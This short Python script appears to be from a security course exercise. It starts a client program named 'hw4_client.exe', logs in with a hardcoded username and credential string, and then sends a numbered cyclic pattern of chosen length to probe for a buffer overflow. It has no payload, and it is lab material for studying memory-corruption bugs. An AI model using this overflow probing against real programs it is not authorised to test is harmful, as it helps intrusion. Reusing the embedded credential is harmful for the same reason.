import subprocess


def attack():


    # start new process and send the payload
    proc = subprocess.Popen("hw4_client.exe PEEK", stdin=subprocess.PIPE, stdout=subprocess.PIPE)

    length = int(input('Length of attack: '))

    login = b"uArcher\n"
    login += b"0N1K02HH0FEQXXAA\n"
    proc.stdin.write(login)
    proc.stdin.flush()

    attack = ''.join([f"{str(n).zfill(3)}A" for n in range(length)])
    attack = attack.encode("utf-8")

    res = proc.communicate(attack)

    #proc.stdin.write(attack)
    print(res)


if __name__ == "__main__":
    attack()
